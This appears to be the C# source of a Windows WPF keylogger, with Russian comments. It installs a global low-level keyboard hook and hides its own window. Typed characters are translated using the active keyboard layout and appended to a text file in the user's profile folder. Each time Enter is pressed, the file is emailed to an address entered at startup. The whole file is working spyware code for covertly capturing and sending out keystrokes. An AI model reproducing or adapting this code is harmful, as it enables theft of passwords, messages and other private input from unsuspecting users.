using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows;
using System.Windows.Input;
using System.ComponentModel;
using WindowsInput;
using System.Globalization;

namespace FinalProgramm
{
    public partial class MainWindow : Window
    {
        private SendEmail sendEmail;

        private InputSimulator inputSimulator = new InputSimulator();

        string emailName;
        string filePath;
        string downloadsPath;
        bool keyboardHookEnabled = true;

        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private const int WM_SYSKEYDOWN = 0x0104;

        private const int KEYEVENTF_EXTENDEDKEY = 0x0001;
        private const int KEYEVENTF_KEYUP = 0x0002;

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private LowLevelKeyboardProc keyboardProc;
        private IntPtr hookId = IntPtr.Zero;

        private dynamic? emailConfig;

        public MainWindow()
        {
            InitializeComponent();
            sendEmail = new SendEmail();
            CreateButton();
        }

        private StreamWriter writer;

        protected override void OnClosing(CancelEventArgs e)
        {
            base.OnClosing(e);
            // Закрытие ресурсов при закрытии окна
            writer?.Close();
            writer?.Dispose();
        }

        private void CreateButton()
        {
            EmailWindow emailWindow = new EmailWindow();
            emailWindow.ShowDialog();
            emailName = emailWindow.Email;

            downloadsPath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
            string filePath = Path.Combine(downloadsPath, $"{sendEmail.recordNumber}.txt");

            // Создаем новый файл, если он уже существует, он будет перезаписан
            File.WriteAllText(filePath, string.Empty);
        }

        protected override void OnSourceInitialized(EventArgs e)
        {
            base.OnSourceInitialized(e);

            // Устанавливаем хук

            keyboardProc = HookCallback;
            hookId = SetHook(keyboardProc);
        }

        protected override void OnClosed(EventArgs e)
        {
            base.OnClosed(e);

            // Удаляем хук перед закрытием приложения
            NativeMethods.UnhookWindowsHookEx(hookId);
        }

        private IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process currentProcess = Process.GetCurrentProcess())
            using (ProcessModule currentModule = currentProcess.MainModule)
            {
                return NativeMethods.SetWindowsHookEx(WH_KEYBOARD_LL, proc, NativeMethods.GetModuleHandle(currentModule.ModuleName), 0);
            }
        }

        private StringBuilder wordBuilder = new StringBuilder();

        private IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            this.Hide();

            if (nCode >= 0 && (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN))
            {

                int vkCode = Marshal.ReadInt32(lParam);

                if (vkCode == KeyInterop.VirtualKeyFromKey(Key.Enter))
                {
                    filePath = Path.Combine(downloadsPath, $"{sendEmail.recordNumber}.txt");
                    sendEmail.SendText(emailConfig, filePath, emailName);
                }


                if (keyboardHookEnabled)
                {
                    // Проверяем клавиши, которые нужно игнорировать
                    if (vkCode != KeyInterop.VirtualKeyFromKey(Key.Insert) &&
                        vkCode != KeyInterop.VirtualKeyFromKey(Key.Delete) &&
                        vkCode != KeyInterop.VirtualKeyFromKey(Key.End) &&
                        vkCode != KeyInterop.VirtualKeyFromKey(Key.Scroll) &&
                        vkCode != KeyInterop.VirtualKeyFromKey(Key.F17) &&
                        vkCode != KeyInterop.VirtualKeyFromKey(Key.F18) &&
                        vkCode != KeyInterop.VirtualKeyFromKey(Key.Home) &&
                        vkCode != KeyInterop.VirtualKeyFromKey(Key.PageUp) &&
                        vkCode != KeyInterop.VirtualKeyFromKey(Key.PageDown) &&
                        vkCode != KeyInterop.VirtualKeyFromKey(Key.RightAlt) &&
                        vkCode != KeyInterop.VirtualKeyFromKey(Key.RightShift) &&
                        vkCode != KeyInterop.VirtualKeyFromKey(Key.LeftCtrl) &&
                        vkCode != KeyInterop.VirtualKeyFromKey(Key.RightCtrl) &&
                        vkCode != KeyInterop.VirtualKeyFromKey(Key.CapsLock) &&
                        vkCode != KeyInterop.VirtualKeyFromKey(Key.Tab) &&
                        vkCode != KeyInterop.VirtualKeyFromKey(Key.LWin) &&
                        vkCode != KeyInterop.VirtualKeyFromKey(Key.RWin) &&
                        vkCode != KeyInterop.VirtualKeyFromKey(Key.Right) &&
                        vkCode != KeyInterop.VirtualKeyFromKey(Key.Left) &&
                        vkCode != KeyInterop.VirtualKeyFromKey(Key.Up) &&
                        vkCode != KeyInterop.VirtualKeyFromKey(Key.Down) &&
                        vkCode != KeyInterop.VirtualKeyFromKey(Key.Escape) &&
                        vkCode != KeyInterop.VirtualKeyFromKey(Key.F1) &&
                        vkCode != KeyInterop.VirtualKeyFromKey(Key.F2) &&
                        vkCode != KeyInterop.VirtualKeyFromKey(Key.F3) &&
                        vkCode != KeyInterop.VirtualKeyFromKey(Key.F4) &&
                        vkCode != KeyInterop.VirtualKeyFromKey(Key.F5) &&
                        vkCode != KeyInterop.VirtualKeyFromKey(Key.F6) &&
                        vkCode != KeyInterop.VirtualKeyFromKey(Key.F7) &&
                        vkCode != KeyInterop.VirtualKeyFromKey(Key.F8) &&
                        vkCode != KeyInterop.VirtualKeyFromKey(Key.F9) &&
                        vkCode != KeyInterop.VirtualKeyFromKey(Key.F10) &&
                        vkCode != KeyInterop.VirtualKeyFromKey(Key.F11) &&
                        vkCode != KeyInterop.VirtualKeyFromKey(Key.Apps) &&
                        vkCode != KeyInterop.VirtualKeyFromKey(Key.F12))
                    {
                        IntPtr layoutHandle = GetCurrentKeyboardLayout();
                        uint processId;
                        uint layoutId = NativeMethods.GetWindowThreadProcessId(IntPtr.Zero, out processId);

                        // Получение текущей раскладки клавиатуры при каждом нажатии клавиши
                        IntPtr currentLayout = NativeMethods.GetKeyboardLayout(layoutId);

                        StringBuilder sb = new StringBuilder(5);
                        int result = NativeMethods.ToUnicodeEx((uint)vkCode, 0, GetKeyStateArray(), sb, sb.Capacity, 0, layoutHandle);
                        char key = result > 0 ? sb.ToString()[0] : '\0';

                        if (key != '\0')
                        {
                            string filePath = Path.Combine(downloadsPath, $"{sendEmail.recordNumber}.txt");
                            File.AppendAllText(filePath, key.ToString());
                        }
                    }
                }
            }
            return NativeMethods.CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
        }

        private byte[] GetKeyStateArray()
        {
            byte[] keyState = new byte[256];
            for (int i = 0; i < 256; i++)
            {
                keyState[i] = (byte)NativeMethods.GetKeyState(i);
            }
            return keyState;
        }

        [DllImport("kernel32.dll")]
        static extern uint GetCurrentThreadId();

        private static IntPtr GetCurrentKeyboardLayout()
        {
            IntPtr foregroundWindow = NativeMethods.GetForegroundWindow();
            uint processId;
            uint threadId = NativeMethods.GetWindowThreadProcessId(foregroundWindow, out processId);
            IntPtr keyboardLayout = NativeMethods.GetKeyboardLayout(threadId);
            return keyboardLayout;
        }

        private static class NativeMethods
        {


            [DllImport("user32.dll")]
            public static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

            [DllImport("user32.dll")]
            public static extern bool UnhookWindowsHookEx(IntPtr hhk);

            [DllImport("user32.dll")]
            public static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

            [DllImport("user32.dll")]
            public static extern IntPtr GetForegroundWindow();

            [DllImport("user32.dll")]
            public static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);

            [DllImport("user32.dll")]
            public static extern uint MapVirtualKeyEx(uint uCode, uint uMapType, IntPtr dwhkl);

            [DllImport("user32.dll")]
            public static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode, byte[] lpKeyState, [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff, int cchBuff, uint wFlags, IntPtr dwhkl);

            [DllImport("user32.dll")]
            public static extern bool GetKeyboardState(byte[] lpKeyState);

            [DllImport("user32.dll")]
            public static extern IntPtr GetKeyboardLayoutList(int nBuff, [Out] IntPtr[] lpList);

            [DllImport("user32.dll")]
            public static extern int GetKeyNameText(int lParam, [Out] StringBuilder lpString, int nSize);

            [DllImport("user32.dll")]
            public static extern IntPtr LoadKeyboardLayout(string pwszKLID, uint Flags);

            [DllImport("user32.dll")]
            public static extern IntPtr ActivateKeyboardLayout(IntPtr hkl, uint Flags);

            [DllImport("kernel32.dll")]
            public static extern IntPtr GetModuleHandle(string lpModuleName);

            [DllImport("user32.dll")]
            public static extern short GetKeyState(int virtualKey);

            [DllImport("user32.dll")]
            public static extern void keybd_event(byte bVk, byte bScan, int dwFlags, int dwExtraInfo);

            [DllImport("user32.dll")]
            private static extern bool GetKeyboardLayoutName(StringBuilder pwszKLID);

            [DllImport("user32.dll")]
            public static extern IntPtr GetKeyboardLayout(uint idThread);

            [DllImport("kernel32.dll")]
            static extern uint GetCurrentThreadId();

        }
    }
}